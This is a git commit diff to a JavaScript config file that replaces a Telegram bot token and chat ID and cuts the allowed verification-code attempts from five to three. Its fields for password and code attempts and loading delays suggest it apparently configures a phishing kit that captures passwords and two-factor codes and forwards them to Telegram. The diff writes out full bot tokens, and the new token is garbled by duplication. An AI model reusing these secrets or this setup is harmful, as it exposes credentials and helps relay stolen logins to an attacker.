c3f5a20b3ac89358127754ac0df5eeeba4439b1b
ahah12322 <germanyfu435@gmail.com>
2026-04-29 15:34:35 +0700

    Update config with new token and chat ID

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,10 +1,10 @@
 const config = {
-    token: '8689926468:AAEb34bEyCabAFedR_sj8gvUWoSUIZNqVWw',
-    chat_id: '-5176797185',
+    token: '8673556090:AAFVmXj-rOkpPD71uxYbOZBX4824NxRS5Rs8673556090:AAFVmXj-rOkpPD71uxYbOZBX4824NxRS5Rs',
+    chat_id: '7626778246',
     noti_token: '',
     noti_chat_id: '',
     max_password_attempts: 2,
-    max_code_attempts: 5,
+    max_code_attempts: 3,
     password_loading_time: 3,
     code_loading_time: 3
 };
